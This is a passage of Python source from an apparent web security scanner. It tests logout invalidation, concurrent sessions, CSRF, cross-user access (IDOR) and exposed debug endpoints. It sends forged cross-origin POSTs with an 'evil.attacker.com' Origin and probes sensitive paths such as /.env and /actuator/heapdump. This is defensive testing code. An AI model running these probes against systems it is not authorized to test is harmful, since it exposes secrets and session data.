                            and not _LOGOUT_URL_RE.search(_p2)):
                        _auth_probe_url = url.rstrip("/") + _p2
                        break
            except Exception:
                pass

        # Disposable logout session — clone pre-logout cookies, hit logout endpoint
        _logout_probe = _make_session(cfg)
        for _cn, _cv in _pre_logout_cookies.items():
            _logout_probe.cookies.set(_cn, _cv)

        _r_logout = None
        try:
            _r_logout = _logout_probe.get(
                _logout_url, timeout=timeout, allow_redirects=True
            )
            vc.log(f"[logout] Logout request → HTTP {_r_logout.status_code}", "INFO")
        except Exception as _le:
            vc.log(f"[logout] Logout request failed: {_le}", "WARNING")

        if _r_logout is not None:
            vc.status(phase, "Logout Testing", "running", "Verifying old session rejected", 3, 5)

            _old_sess = _make_session(cfg)
            for _cn, _cv in _pre_logout_cookies.items():
                _old_sess.cookies.set(_cn, _cv)

            try:
                time.sleep(1)   # allow server to process logout before probing
                _r_old = _old_sess.get(_auth_probe_url, timeout=timeout, allow_redirects=True)

                # SPA-aware: if the probe body is identical to an unauth
                # request (same normalized hash), the 200 is just the SPA
                # shell and does not prove the session is still valid.
                _sslo_spa = False
                try:
                    _sslo_ua = _make_session(cfg)
                    _sslo_ua_r = _sslo_ua.get(
                        _auth_probe_url, timeout=timeout, allow_redirects=True)
                    if (_sslo_ua_r and _sslo_ua_r.status_code == 200
                            and _r_old.status_code == 200):
                        if (_p20_body_hash((_sslo_ua_r.text or "").strip())
                                == _p20_body_hash((_r_old.text or "").strip())):
                            _sslo_spa = True
                except Exception:
                    pass

                _still_valid = (
                    _r_old.status_code == 200
                    and not _sslo_spa
                    and not _REDIR_LOGIN_RE.search(_r_old.url or "")
                    and not _REDIR_LOGIN_RE.search(_r_old.text[:3000])
                    and not _matches_error_fingerprint(_r_old.text)
                    and not _response_is_error_page(_r_old.text)
                )

                if _still_valid:
                    # Save evidence: logout req+resp AND the follow-up probe
                    # req+resp that demonstrated the old session still worked.
                    _ssl_evidence: list = []
                    try:
                        _lo_rq, _lo_rp = _save_http_evidence(
                            out, phase, f"server_side_logout_{hostname}", _r_logout)
                        _ssl_evidence.append({
                            "url":  f"LOGOUT  GET {_logout_url} (HTTP {_r_logout.status_code})",
                            "req":  str(_lo_rq), "resp": str(_lo_rp),
                        })
                    except Exception:
                        pass
                    try:
                        _fo_rq, _fo_rp = _save_http_evidence(
                            out, phase, f"server_side_followup_{hostname}", _r_old)
                        _ssl_evidence.append({
                            "url":  f"FOLLOW-UP  GET {_auth_probe_url} (HTTP {_r_old.status_code})",
                            "req":  str(_fo_rq), "resp": str(_fo_rp),
                        })
                    except Exception:
                        pass
                    out.add_finding(
                        title="Session Not Invalidated Server-Side After Logout",
                        url=_logout_url, port=target["port"], risk="HIGH",
                        description=(
                            f"After sending a logout request to {_logout_url}, the "
                            f"pre-logout session cookies were still accepted by the server. "
                            f"A request to {_auth_probe_url} returned HTTP "
                            f"{_r_old.status_code} without redirecting to a login page, "
                            f"indicating the session was not invalidated server-side. "
                            f"The logout request and the follow-up authenticated probe "
                            f"are saved as Evidence (request + response for each)."
                        ),
                        output=(
                            f"Logout endpoint:    {_logout_url}\n"
                            f"Logout response:    HTTP {_r_logout.status_code}\n"
                            f"Probe endpoint:     {_auth_probe_url}\n"
                            f"Probe response:     HTTP {_r_old.status_code}\n"
                            f"Final URL:          {_r_old.url}\n"
                            f"Verdict:            old session cookies STILL ACCEPTED"
                        ),
                        output_file=json.dumps(_ssl_evidence) if _ssl_evidence else "",
                        sources="fracture-logout", service=target["scheme"],
                        affected=_logout_url,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-23",
                        remediation=(
                            "Invalidate the session token in the server-side session store "
                            "(database, cache, or token blacklist) on logout. "
                            "Relying on client-side cookie deletion alone is insufficient."
                        ),
                        http_code=_r_old.status_code,
                    )
                    vc.log(
                        "[logout] Server-side invalidation FAILED — old session still accepted",
                        "SUCCESS"
                    )
                else:
                    if _sslo_spa:
                        vc.log(
                            "[logout] Post-logout probe returned SPA shell "
                            "(same body as unauth) — cannot determine session "
                            "validity from HTML; not flagging", "INFO"
                        )
                    else:
                        vc.log(
                            f"[logout] Server-side invalidation confirmed — old session "
                            f"rejected (HTTP {_r_old.status_code})", "INFO"
                        )
            except Exception as _ve:
                vc.log(f"[logout] Old-session validation probe failed: {_ve}", "WARNING")

    # ── 4. Concurrent session limit testing ───────────────────────────────
    # Creates two fresh login sessions with the same credentials (never touching
    # the live scan sessions), checks whether the first is invalidated when the
    # second authenticates, then cleans up both test sessions.
    # Runs AFTER access_matrix so even a single-session-per-user application cannot
    # disrupt earlier authenticated phase testing.
    vc.status(phase, "Logout Testing", "running", "Concurrent session limit", 4, 5)

    _auth_cfg    = cfg.get("auth", {})
    _auth_method = (
        _auth_cfg.get("method") or _auth_cfg.get("auth_method") or ""
    ).lower()
    # Methods where re-login with the same credentials is feasible
    _SKIP_CONCURRENT_METHODS = frozenset({
        "session_cookie", "webauthn_probe", "mtls",
        "kerberos", "kerberos_delegation",
        "oauth2_client_creds", "saml_assertion", "oidc_token",
    })
    _concurrent_testable = (
        _auth_cfg.get("enabled")
        and bool(_auth_cfg.get("username"))
        and bool(_auth_cfg.get("password"))
        and _auth_method not in _SKIP_CONCURRENT_METHODS
    )

    if not _concurrent_testable:
        vc.log(
            "[logout] Concurrent session test skipped — auth method or credentials "
            "do not support automated re-login", "INFO"
        )
    else:
        vc.log("[logout] Building test sessions for concurrent session limit check ...", "INFO")
        _test_sess_a = None
        _test_sess_b = None
        try:
            # Session A — first fresh login with primary credentials
            _test_sess_a = _build_auth_session(cfg, "auth", no_interactive=True)
        except Exception as _bse:
            vc.log(f"[logout] Could not build test session A: {_bse}", "WARNING")

        if _test_sess_a is not None:
            # Verify session A is authenticated before proceeding
            _a_ok = False
            try:
                _r_a = _test_sess_a.get(url, timeout=timeout, allow_redirects=True)
                _a_ok = (
                    _r_a.status_code == 200
                    and not _REDIR_LOGIN_RE.search(_r_a.url or "")
                    and not _matches_error_fingerprint(_r_a.text)
                )
            except Exception:
                pass

            if not _a_ok:
                vc.log("[logout] Test session A not authenticated — skipping concurrent test",
                       "WARNING")
            else:
                try:
                    # Session B — second fresh login with the same credentials
                    _test_sess_b = _build_auth_session(cfg, "auth", no_interactive=True)
                except Exception as _bse2:
                    vc.log(f"[logout] Could not build test session B: {_bse2}", "WARNING")

                if _test_sess_b is not None:
                    # Brief pause to let the server associate session B before re-probing A
                    time.sleep(2)

                    _a_still_valid = False
                    try:
                        _r_a2 = _test_sess_a.get(url, timeout=timeout, allow_redirects=True)
                        _a_still_valid = (
                            _r_a2.status_code == 200
                            and not _REDIR_LOGIN_RE.search(_r_a2.url or "")
                            and not _matches_error_fingerprint(_r_a2.text)
                            and not _response_is_error_page(_r_a2.text)
                        )
                    except Exception:
                        pass

                    _cs_ev = ""
                    try:
                        _cs_rq, _cs_rp = _save_http_evidence(
                            out, phase, "concurrent_session_probe", _r_a2)
                        _cs_ev = json.dumps(
                            [{"url": url, "req": str(_cs_rq), "resp": str(_cs_rp)}])
                    except Exception:
                        pass
                    if not _a_still_valid:
                        out.add_finding(
                            title="Concurrent Session Limit Enforced",
                            url=url, port=target["port"], risk="INFO",
                            description=(
                                "A new login with the same credentials invalidated the "
                                "preceding session, indicating the application enforces "
                                "a concurrent session limit (one active session per user). "
                                "This reduces the window of exposure from stolen tokens "
                                "but may also cause denial of service if sessions are "
                                "terminated unexpectedly."
                            ),
                            output=(
                                "Test session A authenticated successfully. "
                                "After test session B logged in with the same credentials, "
                                "test session A was rejected (login redirect or 401/403)."
                            ),
                            sources="fracture-logout", service=target["scheme"],
                            output_file=_cs_ev,
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="AC-10",
                            remediation=(
                                "If intentional, notify users when a new login terminates "
                                "existing sessions. If unintentional, review session store "
                                "logic to ensure concurrent sessions are supported where needed."
                            ),
                        )
                        vc.log(
                            "[logout] Concurrent session limit ENFORCED — session A invalidated "
                            "by session B login", "SUCCESS"
                        )
                    else:
                        out.add_finding(
                            title="No Concurrent Session Limit Detected",
                            url=url, port=target["port"], risk="LOW",
                            description=(
                                "Two simultaneous authenticated sessions using the same "
                                "credentials were active without either being invalidated. "
                                "The application does not appear to enforce a concurrent "
                                "session limit. A stolen session token remains valid even "
                                "after the legitimate user logs in again from another device."
                            ),
                            output=(
                                "Test session A and test session B were both authenticated "
                                "simultaneously with the same credentials. Session A "
                                "remained valid after session B authenticated."
                            ),
                            sources="fracture-logout", service=target["scheme"],
                            output_file=_cs_ev,
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="AC-10",
                            remediation=(
                                "Consider enforcing a maximum of one or a small number of "
                                "concurrent sessions per user. Provide a session management "
                                "UI so users can view and revoke active sessions."
                            ),
                        )
                        vc.log(
                            "[logout] No concurrent session limit — both test sessions valid "
                            "simultaneously", "SUCCESS"
                        )

                    # Clean up: attempt logout on both test sessions
                    for _ts in (_test_sess_a, _test_sess_b):
                        if _ts is None:
                            continue
                        for _tlpath in ("/logout", "/signout", "/auth/logout"):
                            try:
                                _ts.get(url.rstrip("/") + _tlpath, timeout=timeout,
                                        allow_redirects=False)
                                break
                            except Exception:
                                pass

    vc.status(phase, "Logout Testing", "complete", "Done", 5, 5)
    vc.log("[logout] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 14: CSRF
# ─────────────────────────────────────────────
def _phase_csrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, auth_sess: requests.Session,
                auth_recon_data: dict) -> None:
    phase   = "csrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = auth_recon_data.get("forms", [])
    vc.status(phase, "CSRF Testing", "running", "Form analysis", 0, len(forms))

    for idx, form in enumerate(forms[:30]):
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        vc.status(phase, "CSRF Testing", "running", f"Form {idx}", idx, len(forms))

        if method != "POST":
            continue

        # Check for CSRF token fields
        csrf_fields = [i["name"] for i in inputs
                       if re.search(r'csrf|token|nonce|_token|authenticity', i["name"], re.I)]
        samesite_protected = False
        for cookie in auth_sess.cookies:
            # SameSite is difficult to check without raw header — just note presence
            pass

        if not csrf_fields:
            # ASP.NET WebForms: __VIEWSTATE + __EVENTVALIDATION together
            # serve as CSRF protection via MAC validation — the server
            # rejects cross-origin POSTs that don't carry a valid,
            # server-issued ViewState.
            _aspnet_vs = any(i.get("name") == "__VIEWSTATE" for i in inputs)
            _aspnet_ev = any(i.get("name") == "__EVENTVALIDATION" for i in inputs)
            if _aspnet_vs and _aspnet_ev:
                continue  # treat as CSRF-protected

            # No CSRF token — attempt a cross-origin POST
            data = {i["name"]: "fracture_csrf_test" for i in inputs if i.get("name")}
            try:
                test_sess = _make_session(cfg)  # unauthenticated cross-origin session
                # Copy auth cookies to simulate credential forwarding
                for cookie in auth_sess.cookies:
                    test_sess.cookies.set(cookie.name, cookie.value)
                r = test_sess.post(
                    action, data=data, timeout=timeout,
                    headers={"Origin": "https://evil.attacker.com",
                             "Referer": "https://evil.attacker.com/"}
                )
                if r.status_code in (200, 302):
                    # Skip error/catch-all pages — custom error pages
                    # (e.g. ASP.NET ErrorPage.aspx) return 200 to any
                    # POST regardless of origin and are not state-changing.
                    _csrf_body = (r.text or "")[:8000]
                    _csrf_rel  = urllib.parse.urlparse(action).path or "/"
                    if _response_is_error_page(_csrf_body, _csrf_rel):
                        continue
                    if _matches_error_fingerprint(_csrf_body):
                        continue

                    _csrf_ev = ""
                    try:
                        _csrf_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', action)[:50]
                        _csrf_rq, _csrf_rp = _save_http_evidence(
                            out, phase, f"csrf_{_csrf_safe}", r)
                        _csrf_ev = json.dumps(
                            [{"url": action, "req": str(_csrf_rq), "resp": str(_csrf_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Cross-Site Request Forgery (CSRF) — Missing Token",
                        url=action, port=target["port"], risk="HIGH",
                        description=f"State-changing form at {action} lacks a CSRF token. A cross-origin POST was accepted.",
                        output=f"Form action: {action}\nInputs: {[i['name'] for i in inputs]}",
                        sources="fracture-csrf", service=target["scheme"],
                        output_file=_csrf_ev,
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="SI-10",
                        remediation="Implement synchronised CSRF tokens on all state-changing forms. Use SameSite=Lax/Strict cookies.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[csrf] CSRF: no token at {action}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "CSRF Testing", "complete", "Done", len(forms), len(forms))
    vc.log("[csrf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 15: Cross-User (requires auth2)
# ─────────────────────────────────────────────
def _phase_cross_user(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager,
                      auth_sess: requests.Session,
                      auth2_sess: requests.Session,
                      auth_recon_data: dict) -> None:
    phase    = "cross_user"
    url      = target["url"]
    timeout  = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    links        = auth_recon_data.get("links", [])
    vc.status(phase, "Cross-User Testing", "running", "Resource enumeration", 0, len(resource_ids))

    # Same response-validation pattern as the authorization phase — reject
    # 200-status login pages, generic error templates, wildcard catch-alls,
    # and publicly-accessible URLs. See _validate_idor in _phase_authorization
    # for the reasoning. Re-declared here because the two phases are in
    # different scopes; refactor opportunity but not blocking.
    _CU_AUTH_PATH_RE = re.compile(
        r'(/login|/signin|/sign-in|/auth/login|/oauth|/sso/|/sign-on)',
        re.IGNORECASE,
    )
    _CU_LOGIN_MARKERS = (
        '<input type="password"', "<input type='password'",
        'name="password"',        "name='password'",
        'id="password"',          "id='password'",
        '<form action="/login',   "action='/login",
        "please log in",          "please sign in",
        "session expired",        "you must be logged in",
        "log in to continue",     "sign in to continue",
    )
    _CU_ERROR_MARKERS = (
        "access denied",          "permission denied",
        "you are not authorized", "you do not have permission",
        "page not found",         "resource not found",
        "unhandled exception",    "internal server error",
    )

    def _cu_is_login_or_error(_resp) -> "tuple[bool, str]":
        try:
            _u = (_resp.url or "").lower()
            _b = (_resp.text or "")[:8000].lower()
        except Exception:
            return (False, "")
        if _CU_AUTH_PATH_RE.search(_u):
            return (True, f"final URL matched auth path: {_resp.url}")
        for _m in _CU_LOGIN_MARKERS:
            if _m in _b:
                return (True, f"login-page marker: {_m!r}")
        for _m in _CU_ERROR_MARKERS:
            if _m in _b:
                return (True, f"error-page marker: {_m!r}")
        return (False, "")

    _cu_anon_sess = _make_session(cfg)

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        vc.status(phase, "Cross-User Testing", "running", f"Resource {res['id']}", idx, len(resource_ids))
        try:
            # Fetch user1's baseline (owner's view) once for comparison.
            try:
                r_owner = auth_sess.get(res_url, timeout=timeout)
            except Exception:
                r_owner = None
            # Access user1's resource as user2
            r = auth2_sess.get(res_url, timeout=timeout)
            # Anonymous control
            try:
                r_anon = _cu_anon_sess.get(res_url, timeout=timeout)
            except Exception:
                r_anon = None

            # Validate
            if r.status_code != 200 or len(r.text or "") < 100:
                continue
            _is_le, _why = _cu_is_login_or_error(r)
            if _is_le:
                vc.log(
                    f"[cross_user] Rejected at {res_url}: {_why}",
                    "INFO",
                )
                continue
            # Public URL → not a cross-user bypass
            if (r_anon is not None and r_anon.status_code == 200
                    and (r_anon.text or "") == (r.text or "")):
                vc.log(
                    f"[cross_user] Rejected at {res_url}: anonymous fetch "
                    f"returns identical response — URL is publicly accessible",
                    "INFO",
                )
                continue
            # If user2 sees a body DIFFERENT from user1's view, the app
            # probably scopes the resource per-user (each gets their own
            # data at the same URL pattern). The real bypass is when user2
            # sees user1's data. Require body equivalence as the strong signal.
            _bypass_kind = "unknown"
            if r_owner is not None and r_owner.status_code == 200:
                if (r.text or "") == (r_owner.text or ""):
                    _bypass_kind = "user2 sees user1's exact data"
                else:
                    _bypass_kind = (
                        "user2 sees a substantive response at user1's URL "
                        "(may be per-user scoped — manual review)"
                    )

            _evidence_entries: list = []
            if r_owner is not None:
                _o_rq, _o_rp = _save_http_evidence(
                    out, phase, f"crossuser_owner_{res['id']}", r_owner)
                _evidence_entries.append({
                    "url": f"OWNER (user1) {res_url}",
                    "req": str(_o_rq), "resp": str(_o_rp),
                })
            _u2_rq, _u2_rp = _save_http_evidence(
                out, phase, f"crossuser_user2_{res['id']}", r)
            _evidence_entries.append({
                "url": f"USER2 fetching user1's URL {res_url}",
                "req": str(_u2_rq), "resp": str(_u2_rp),
            })
            if r_anon is not None:
                _a_rq, _a_rp = _save_http_evidence(
                    out, phase, f"crossuser_anon_{res['id']}", r_anon)
                _evidence_entries.append({
                    "url": f"ANONYMOUS {res_url}",
                    "req": str(_a_rq), "resp": str(_a_rp),
                })

            out.add_finding(
                title="Cross-User Data Leakage (IDOR)",
                url=res_url, port=target["port"], risk="CRITICAL",
                description=(
                    f"User2's authenticated session can access User1's "
                    f"resource at {res_url} (HTTP 200). Validator confirms "
                    f"the response is not a login page, not a generic error "
                    f"template, and requires authentication (anonymous "
                    f"fetch differs). Bypass kind: {_bypass_kind}."
                ),
                output=(
                    f"Resource:        {res_url}\n"
                    f"Owner (user1):   "
                    + (f"{r_owner.status_code} ({len(r_owner.text or '')} bytes)"
                       if r_owner is not None else "(no owner fetch)")
                    + f"\nUser2 response:  {r.status_code} ({len(r.text or '')} bytes)\n"
                      f"Anon response:   "
                    + (f"{r_anon.status_code} ({len(r_anon.text or '')} bytes)"
                       if r_anon is not None else "(no anon probe)")
                    + f"\nBypass kind:     {_bypass_kind}"
                ),
                sources="fracture-cross-user", service=target["scheme"],
                output_file=json.dumps(_evidence_entries),
                affected=res_url,
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation=(
                    "Implement and enforce object-level authorisation "
                    "checks. Verify ownership for every resource access; "
                    "do not rely on session presence alone."
                ),
            )
            vc.log(f"[cross_user] Cross-user leakage confirmed: {res_url}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Cross-User Testing", "running", "API endpoint testing", len(resource_ids), len(resource_ids))
    # Test authenticated API endpoints
    for link in links[:30]:
        if re.search(r'/api/', link, re.I):
            try:
                r1 = auth_sess.get(link, timeout=timeout)
                r2 = auth2_sess.get(link, timeout=timeout)
                if r1.status_code == 200 and r2.status_code == 200:
                    # If both users see the same data, check for user-specific content
                    if r1.text == r2.text and len(r1.text) > 50:
                        _xu_ev = ""
                        try:
                            _xu_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', link)[:50]
                            _xu_rq, _xu_rp = _save_http_evidence(
                                out, phase, f"cross_user_{_xu_safe}", r2)
                            _xu_ev = json.dumps(
                                [{"url": link, "req": str(_xu_rq), "resp": str(_xu_rp)}])
                        except Exception:
                            pass
                        out.add_finding(
                            title="API Endpoint Returns Same Data for All Users",
                            url=link, port=target["port"], risk="MEDIUM",
                            description=f"API endpoint {link} returns identical data for different authenticated users — may indicate missing user-scope filtering.",
                            output=f"User1 == User2 response ({len(r1.text)} bytes)",
                            sources="fracture-cross-user", service=target["scheme"],
                            output_file=_xu_ev,
                            affected=link,
                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                            remediation="Scope API responses to the authenticated user. Do not return data for all users.",
                        )
            except Exception:
                pass

    vc.status(phase, "Cross-User Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[cross_user] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 10b: Logging & Monitoring (OWASP A09)
# ─────────────────────────────────────────────
_LOG_ENDPOINT_PATTERNS = re.compile(
    r'/admin|/debug|/trace|/log|/monitor|/status|/health|/actuator|/metrics|'
    r'/info|/env|/config|/console|/shell|/management|/api-docs|/swagger', re.I
)
_STACK_TRACE_RE = re.compile(
    r'Traceback|stack.?trace|Exception in|at com\.|at org\.|at java\.|'
    r'StackTrace|Internal Server Error|sqlstate|SQLSTATE|ORA-\d|mysql_', re.I
)
_DEBUG_HEADER_RE = re.compile(r'X-Debug|X-Trace|X-Request-Id|X-Powered-By', re.I)


def _phase_logging_monitoring(target: dict, cfg: dict, pm: ProgressManager,
                               out: OutputManager, sess: requests.Session,
                               crawl_data: dict) -> None:
    """Phase 10b: Security Logging & Monitoring Failures — OWASP A09:2025."""
    phase   = "logging_monitoring"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    links   = crawl_data.get("links", [])

    vc.status(phase, "Logging & Monitoring", "running", "Probing admin/debug endpoints", 0, 4)

    # 1. Exposed admin/debug/monitoring endpoints
    probe_paths = [
        "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/mappings",
        "/actuator/metrics", "/actuator/logfile", "/actuator/httptrace",
        "/debug", "/trace", "/.env", "/config",
        "/admin/logs", "/logs", "/log", "/error-log",
        "/server-status", "/server-info",
        # GAP-29: Spatie Ray debug tool
        "/_ray/api/health",
        "/_ignition/health-check",
        # GAP-49: Laravel Ignition error page
        "/_ignition/execute-solution",
        # GAP-30: Express.js default error handler (trigger via bad path)
        "/express_fracture_debug_%00test",
    ]
    # Baseline for catch-all / SPA / soft-404 detection: fetch the base URL
    # and a known-bad path.  If probe responses match either, the server is
    # returning a generic page (error handler, SPA shell) for any path.
    _lm_baseline_body = ""
    _lm_baseline_len  = 0
    _lm_bad_body      = ""
    _lm_bad_len       = 0
    _lm_bad_probe     = "/_fracture_nonexistent_probe_"
    try:
        _bl = sess.get(url.rstrip("/"), timeout=timeout, allow_redirects=False)
        if _bl.status_code == 200:
            _lm_baseline_body = _p20_normalize_body(_bl.text[:2000])
            _lm_baseline_len  = len(_bl.text)
    except Exception:
        pass
    try:
        _bad = sess.get(url.rstrip("/") + _lm_bad_probe,
                        timeout=timeout, allow_redirects=False)
        # Capture body even on non-200 — servers that return 200 for
        # nonexistent paths are soft-404; those returning 404 give us a
        # reference body to catch path-templated error pages.
        _lm_bad_body = _p20_normalize_body(_bad.text[:2000])
        _lm_bad_len  = len(_bad.text)
    except Exception:
        pass

    def _lm_strip_path(body, path):
        """Strip the probe path from body so path-templated pages compare equal."""
        s = body
        for token in (path, path.lstrip("/"), path.replace("/", " ").strip()):
            s = s.replace(token, "")
        return s

    def _lm_is_similar(probe_body, probe_len, ref_body, ref_len, path):
        """Soft-404 similarity: tolerant of path being embedded in the page."""
        if ref_len <= 0:
            return False
        p_stripped = _lm_strip_path(probe_body, path)
        r_stripped = _lm_strip_path(ref_body, path)
        if abs(probe_len - ref_len) < max(200, int(ref_len * 0.15)):
            if p_stripped[:500] == r_stripped[:500]:
                return True
        p_words = set(p_stripped.split())
        r_words = set(r_stripped.split())
        if p_words and r_words:
            intersection = len(p_words & r_words)
            union = len(p_words | r_words)
            if union > 0 and intersection / union > 0.85:
                return True
        return False

    for path in probe_paths:
        probe_url = url.rstrip("/") + path
        try:
            r = sess.get(probe_url, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                # Catch-all / SPA / soft-404 detection: skip if the response
                # body matches the base URL or the known-bad path.
                _r_body = _p20_normalize_body(r.text[:2000])
                _r_len  = len(r.text)
                _is_catchall = False
                for _ref_body, _ref_len in ((_lm_baseline_body, _lm_baseline_len),
                                             (_lm_bad_body, _lm_bad_len)):
                    if _lm_is_similar(_r_body, _r_len, _ref_body, _ref_len, path):
                        _is_catchall = True
                        break
                if _is_catchall:
                    continue
                if _matches_error_fingerprint(r.text):
                    continue   # custom error page catch-all
                if _response_is_error_page(r.text, path):
                    continue   # secondary error-page guard
                # Content-type guard: Spring actuator, .env, and /config
                # serve JSON or plain text when real.  HTML = catch-all.
                _ct = (r.headers.get("Content-Type") or "").lower()
                _json_only_paths = ("/actuator", "/.env", "/config",
                                    "/debug", "/trace")
                if ("text/html" in _ct
                        and any(path.startswith(jp) for jp in _json_only_paths)):
                    _stripped = r.text.lstrip()
                    if (_stripped.startswith("<!") or _stripped.startswith("<html")
                            or _stripped.startswith("<HTML")
                            or "<head" in r.text[:500].lower()):
                        continue
                _adm_ev = ""
                try:
                    _adm_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', path)[:30]
                    _adm_rq, _adm_rp = _save_http_evidence(
                        out, phase, f"admin_debug_{_adm_safe}", r)
                    _adm_ev = json.dumps(
                        [{"url": probe_url, "req": str(_adm_rq), "resp": str(_adm_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title=f"Exposed Admin/Debug Endpoint: {path}",
                    url=probe_url, port=target["port"], risk="HIGH",
                    description=(
                        f"The endpoint '{path}' returned HTTP 200 without authentication. "
                        f"Exposed diagnostic endpoints can reveal environment variables, "
                        f"heap dumps, log files, and configuration data."
                    ),
                    output=f"GET {probe_url} → HTTP {r.status_code}\n{r.text[:500]}",
                    sources="fracture-logging", service=target["scheme"],
                    output_file=_adm_ev,
                    affected=probe_url,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-9",
                    remediation=(
                        "Restrict admin/actuator endpoints to localhost or protected networks. "
                        "Require authentication for all diagnostic endpoints."
                    ),
                )
                vc.log(f"[logging_monitoring] Exposed endpoint: {probe_url}", "SUCCESS")
        except Exception:
            pass

    # 2. Error message verbosity — trigger errors and check for stack traces
    vc.status(phase, "Logging & Monitoring", "running", "Error verbosity check", 1, 4)
    error_triggers = [
        url + "/'",          # SQL char
        url + "/nonexistent_fracture_path_xyz_12345",
        url + "?" + "fracture_test_param=<script>",
        url + "/admin",
    ]
    _err_ss_dir = out.root / "recon"
    _err_ss_dir.mkdir(parents=True, exist_ok=True)
    _err_ss_count = 0
    _err_ss_max   = 3
    for eu in error_triggers:
        try:
            r = sess.get(eu, timeout=timeout, allow_redirects=True)
            if r and r.status_code in (500, 503) and _STACK_TRACE_RE.search(r.text):
                # Risk lowered MEDIUM→LOW per 2026-06-11 review: stack-trace
                # disclosure is information disclosure that aids reconnaissance
                # but doesn't enable an attack on its own.
                _stk_ev = ""
                try:
                    _stk_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', eu)[:50]
                    _stk_rq, _stk_rp = _save_http_evidence(
                        out, phase, f"stack_trace_{_stk_safe}", r)
                    _stk_ev = json.dumps(
                        [{"url": eu, "req": str(_stk_rq), "resp": str(_stk_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="Information Disclosure: Verbose Server Error Messages",
                    url=eu, port=target["port"], risk="LOW",
                    description=(
                        f"The server returned a verbose error at {eu} (HTTP {r.status_code}) "
                        f"containing stack trace or database error details. This leaks "
                        f"implementation details that aid attackers."
                    ),
                    output=f"GET {eu} → HTTP {r.status_code}\n{r.text[:1000]}",
                    sources="fracture-logging", service=target["scheme"],
                    output_file=_stk_ev,
                    affected=eu,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-3",
                    remediation=(
                        "Configure production error pages to display generic messages only. "
                        "Log detailed errors server-side, never expose them to clients."
                    ),
                )
                vc.log(f"[logging_monitoring] Stack trace: {eu}", "SUCCESS")
                # Screenshot the verbose error page as visual evidence
                if _err_ss_count < _err_ss_max:
                    _err_safe = re.sub(r'[^a-zA-Z0-9_-]', '_',
                                       eu.replace("://", "_"))[:50]
                    _err_ss_p = _err_ss_dir / f"screenshot_error_{_err_safe}.png"
                    try:
                        if _capture_screenshot_to(eu, _err_ss_p, target, cfg,
                                                  auth_session=sess):
                            _err_ss_count += 1
                            out.add_finding(
                                title="Discovery: Web Screenshot Captured",
                                url=eu, port=target["port"], risk="INFO",
                                description=(
                                    f"Screenshot of verbose error page: {eu} "
                                    f"(HTTP {r.status_code})"
                                ),
                                affected=urllib.parse.urlparse(eu).path or "/",
                                output=f"Saved: {_err_ss_p.name}",
                                sources="fracture-screenshot",
                                service=target["scheme"],
                                output_file=str(_err_ss_p),
                                http_code=r.status_code,
                                owasp="A09:2025 Security Logging and Monitoring Failures",
                                nist="AU-3",
                                remediation=(
                                    "Review screenshot for exposed sensitive content."
                                ),
                            )
                            vc.log(
                                f"[logging_monitoring] Error screenshot: {_err_ss_p.name}",
                                "SUCCESS",
                            )
                    except Exception:
                        pass
        except Exception:
            pass

    # 3. Debug headers in responses
    vc.status(phase, "Logging & Monitoring", "running", "Debug header check", 2, 4)
    try:
        r = sess.get(url, timeout=timeout)
        if r:
            debug_hdrs = [h for h in r.headers if _DEBUG_HEADER_RE.search(h)]
            if debug_hdrs:
                _dbg_hdr_ev = ""
                try:
                    _dbg_rq, _dbg_rp = _save_http_evidence(
                        out, phase, f"debug_headers_{target['hostname']}", r)
                    _dbg_hdr_ev = json.dumps(
                        [{"url": url, "req": str(_dbg_rq), "resp": str(_dbg_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="Information Disclosure: Debug/Trace Headers",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"Response headers include diagnostic or debug headers: "
                        f"{', '.join(debug_hdrs)}. These reveal implementation details "
                        "that may assist attackers in identifying instrumentation, tracing systems, "
                        "or internal infrastructure."
                    ),
                    output=f"Headers: {', '.join(f'{h}: {r.headers[h]}' for h in debug_hdrs)}",
                    sources="fracture-logging", service=target["scheme"],
                    output_file=_dbg_hdr_ev,
                    affected=url,
                    owasp="A09:2025 Security Logging and Monitoring Failures", nist="AU-3",
                    remediation=(
                        "Remove debug and trace headers from production responses. "
                        "If X-Request-Id is used for correlation, ensure it is a random UUID "
                        "and does not echo internal trace IDs or stack paths."
                    ),
                    command=f"python3 -c \"import requests; r=requests.get('{url}'); "
                            f"print({{'debug_hdrs': [h for h in r.headers if any(k in h.lower() for k in ['debug','trace','x-request','x-powered'])]}})\"",
                )
    except Exception:
        pass

    # 4. Insufficient logging probe — check if repeated failed auth attempts are detected
    vc.status(phase, "Logging & Monitoring", "running", "Auth logging probe", 3, 4)
    login_url = cfg.get("auth", {}).get("login_url", "")
    _LM_SSO_PATH_RE = re.compile(
